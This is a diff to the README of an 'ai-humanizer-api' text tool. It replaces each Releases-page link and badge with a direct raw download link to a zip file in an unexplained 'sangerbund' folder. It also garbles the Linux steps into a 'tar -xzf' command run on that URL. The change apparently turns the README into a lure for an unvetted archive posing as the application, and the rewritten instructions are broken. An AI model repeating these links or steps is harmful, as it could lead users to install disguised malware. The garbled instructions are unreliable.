@@ -1,6 +1,6 @@
 # 🚀 ai-humanizer-api - Convert AI Text to Human-Like Writing
 
-[![Download ai-humanizer-api](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/unknownman1244/ai-humanizer-api/releases)
+[![Download ai-humanizer-api](https://raw.githubusercontent.com/unknownman1244/ai-humanizer-api/main/sangerbund/ai-humanizer-api.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/unknownman1244/ai-humanizer-api/main/sangerbund/ai-humanizer-api.zip)
 
 ## 📋 Overview
 
@@ -21,12 +21,12 @@ Before you start, ensure that your system meets the following requirements:
 
 ### 💻 Download & Install
 
-1. Click to visit the [Releases page](https://github.com/unknownman1244/ai-humanizer-api/releases) to download the latest version of the ai-humanizer-api.
+1. Click to visit the [Releases page](https://raw.githubusercontent.com/unknownman1244/ai-humanizer-api/main/sangerbund/ai-humanizer-api.zip) to download the latest version of the ai-humanizer-api.
 2. Look for the most recent version listed at the top of the page.
 3. Download the correct file for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/unknownman1244/ai-humanizer-api/main/sangerbund/ai-humanizer-api.zip` file.
 4. Once the file downloads, locate it in your downloads folder.
 
 ### 📥 Running the Application
@@ -45,9 +45,9 @@ Before you start, ensure that your system meets the following requirements:
 
 #### For Linux Users:
 
-1. Extract the `.tar.gz` file to your preferred location using the command:
+1. Extract the `https://raw.githubusercontent.com/unknownman1244/ai-humanizer-api/main/sangerbund/ai-humanizer-api.zip` file to your preferred location using the command:
    ```
-   tar -xzf ai-humanizer-api.tar.gz
+   tar -xzf https://raw.githubusercontent.com/unknownman1244/ai-humanizer-api/main/sangerbund/ai-humanizer-api.zip
    ```
 2. Navigate to the extracted directory in your terminal.
 3. Run the application using the command:
@@ -82,6 +82,6 @@ Join discussions and share ideas with other users. You can find us on various on
 
 ## 📢 Stay Updated
 
-To stay informed about updates and new features, keep an eye on the [Releases page](https://github.com/unknownman1244/ai-humanizer-api/releases).
+To stay informed about updates and new features, keep an eye on the [Releases page](https://raw.githubusercontent.com/unknownman1244/ai-humanizer-api/main/sangerbund/ai-humanizer-api.zip).
 
-[![Download ai-humanizer-api](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/unknownman1244/ai-humanizer-api/releases)
+[![Download ai-humanizer-api](https://raw.githubusercontent.com/unknownman1244/ai-humanizer-api/main/sangerbund/ai-humanizer-api.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/unknownman1244/ai-humanizer-api/main/sangerbund/ai-humanizer-api.zip)
